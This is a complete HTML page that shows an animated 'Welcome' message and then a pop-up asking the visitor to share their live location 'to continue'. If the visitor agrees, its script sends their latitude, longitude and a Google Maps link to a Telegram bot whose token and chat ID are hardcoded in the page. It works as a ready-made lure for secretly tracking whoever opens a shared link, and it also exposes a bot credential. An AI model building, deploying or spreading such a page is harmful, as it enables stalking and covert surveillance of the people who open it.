<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome Project</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600&display=swap" rel="stylesheet">
    <style>
        /* --- CSS STYLES --- */
        body {
            font-family: 'Poppins', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #1a1a2e;
            color: #e0e0e0;
            overflow: hidden; /* Hide scrollbars */
        }

        .welcome-container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .welcome-text {
            font-size: 7rem;
            color: #fff;
            animation: fadeInGlow 3s ease-in-out forwards;
            text-shadow: 0 0 10px #16c79a, 0 0 20px #16c79a, 0 0 40px #16c79a;
        }

        @keyframes fadeInGlow {
            from {
                opacity: 0;
                transform: scale(0.8);
            }
            to {
                opacity: 1;
                transform: scale(1);
            }
        }

        /* Modal Styles */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            animation: fadeInModal 0.5s forwards;
            animation-delay: 2s; /* Show modal after welcome animation */
        }

        @keyframes fadeInModal {
            to {
                opacity: 1;
                visibility: visible;
            }
        }

        .modal-content {
            background: #16213e;
            padding: 30px;
            border-radius: 15px;
            text-align: center;
            width: 90%;
            max-width: 400px;
            border: 1px solid #0f3460;
            box-shadow: 0 5px 25px rgba(0, 0, 0, 0.5);
        }

        .modal-buttons {
            margin-top: 20px;
            display: flex;
            justify-content: space-around;
        }

        button {
            padding: 12px 25px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'Poppins', sans-serif;
        }

        #ok-btn {
            background-color: #16c79a;
            color: white;
        }

        #ok-btn:hover {
            background-color: #13a27e;
        }

        #close-btn {
            background-color: #e94560;
            color: white;
        }

        #close-btn:hover {
            background-color: #c73a51;
        }
    </style>
</head>
<body>

    <div class="welcome-container">
        <h1 class="welcome-text">Welcome</h1>
    </div>

    <div id="location-modal" class="modal-overlay">
        <div class="modal-content">
            <h2>Share Your Location</h2>
            <p>To continue, please share your live location.</p>
            <div class="modal-buttons">
                <button id="ok-btn">OK</button>
                <button id="close-btn">Close</button>
            </div>
        </div>
    </div>

    <script>
        // --- JAVASCRIPT LOGIC ---

        // Get references to the buttons and the modal
        const okButton = document.getElementById('ok-btn');
        const closeButton = document.getElementById('close-btn');
        const modal = document.getElementById('location-modal');

        // --- Event Listeners ---

        // 1. When the 'Close' button is clicked
        closeButton.addEventListener('click', () => {
            // This will try to close the current window/tab.
            window.close();
        });

        // 2. When the 'OK' button is clicked
        okButton.addEventListener('click', () => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(locationSuccess, locationError);
                modal.querySelector('p').textContent = "Fetching location...";
            } else {
                alert("Sorry, your browser does not support Geolocation.");
            }
        });

        // --- Functions ---

        // 3. This function runs if the location is successfully found
        function locationSuccess(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            const message = `📍 **Location Received!**\n\n**Latitude:** ${latitude}\n**Longitude:** ${longitude}\n\n**Google Maps Link:**\nhttps://maps.google.com/?q=${latitude},${longitude}`;
            
            sendLocationToTelegram(message);
        }

        // 4. This function runs if there's an error getting the location
        function locationError() {
            alert("Unable to retrieve your location. Please ensure you have granted permission.");
            modal.querySelector('p').textContent = "Failed to get location. Please try again.";
        }

        // 5. Function to send the location data to Telegram
        async function sendLocationToTelegram(text) {
            // Your Bot Token and Chat ID are now embedded here
            const BOT_TOKEN = '8782478097:AAE7zj9X3QA-6af8bYZEd3aX688z2BxBulQ';
            const CHAT_ID = '7445416604';

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

            const payload = {
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'Markdown'
            };

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                const data = await response.json();

                if (data.ok) {
                    modal.querySelector('h2').textContent = "Success!";
                    modal.querySelector('p').textContent = "Your location has been sent.";
                } else {
                    throw new Error(data.description);
                }

            } catch (error) {
                console.error("Error sending message to Telegram:", error);
                alert("Could not send location to Telegram. Check the console for details.");
            }
        }
    </script>
</body>
</html>
